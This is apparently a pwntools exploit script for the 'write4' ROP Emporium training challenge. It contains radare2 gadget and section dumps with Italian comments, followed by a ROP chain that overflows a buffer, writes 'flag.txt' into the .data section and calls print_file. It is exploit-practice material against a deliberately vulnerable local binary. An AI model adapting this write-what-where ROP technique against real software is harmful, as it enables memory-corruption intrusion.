from pwn import *

context.binary = elf = ELF('./write4')
'''
pop_r14_r15
0x00400690               415e  pop r14
0x00400692               415f  pop r15
0x00400694                 c3  ret

;-- usefulGadgets:
0x00400628      4d893e         mov qword [r14], r15
0x0040062b      c3             ret

pop_rdi
0x00400693                 5f  pop rdi
0x00400694                 c3  ret

┌ 17: sym.usefulFunction ();
│           0x00400617      55             push rbp
│           0x00400618      4889e5         mov rbp, rsp
│           0x0040061b      bfb4064000     mov edi, str.nonexistent    ; 0x4006b4 ; "nonexistent"
│           0x00400620      e8ebfeffff     call sym.imp.print_file
│           0x00400625      90             nop
│           0x00400626      5d             pop rbp
└           0x00400627      c3             ret

[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000006b4 0x004006b4 11  12   .rodata ascii nonexistent

ma con rabin2 -S write4 vedo che rodata ha permessi di sola lettura
15  0x000006b0   0x10 0x004006b0   0x10 -r-- .rodata

possiamo scivere solo su queste sezioni 

18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss


[0x004004f0]> s sym..plt 
[0x004004f0]> pd 20
            ; CODE XREFS from sym._init @ +0x3b, +0x4b
            ;-- section..plt:
            ;-- .plt:
       ┌┌─> 0x004004f0      ff35120b2000   push qword [0x00601008]     ; [12] -r-x section size 48 named .plt
       ╎╎   0x004004f6      ff25140b2000   jmp qword [0x00601010]      ; [0x601010:8]=0
       ╎╎   0x004004fc      0f1f4000       nop dword [rax]
       ╎╎   ; CALL XREF from main @ 0x40060b
┌ 6: sym.imp.pwnme ();
└      ╎╎   0x00400500      ff25120b2000   jmp qword [reloc.pwnme]     ; [0x601018:8]=0x400506
       ╎╎   0x00400506      6800000000     push 0
       └──< 0x0040050b      e9e0ffffff     jmp sym..plt
        ╎   ; CALL XREF from sym.usefulFunction @ 0x400620
┌ 6: sym.imp.print_file ();
└       ╎   0x00400510      ff250a0b2000   jmp qword [reloc.print_file] ; [0x601020:8]=0x400516
        ╎   0x00400516      6801000000     push 1                      ; 1
        └─< 0x0040051b      e9d0ffffff     jmp sym..plt



'''

pop_r14_r15     = 0x400690
mov_ptr_r14_r15 = 0x400628
pop_rdi         = 0x400693

where    = 0x00601028 #data
what     = unpack(b'flag.txt')
call_print_file_plt = 0x00400510

offset = 40

payload = b'A'*offset + p64(pop_r14_r15)+p64(where)+p64(what)+p64(mov_ptr_r14_r15)+p64(pop_rdi)+p64(where)+p64(call_print_file_plt)
p = elf.process()
#gdb.attach(p)

p.recv()
p.sendline(payload)
log.info(p.recvall())

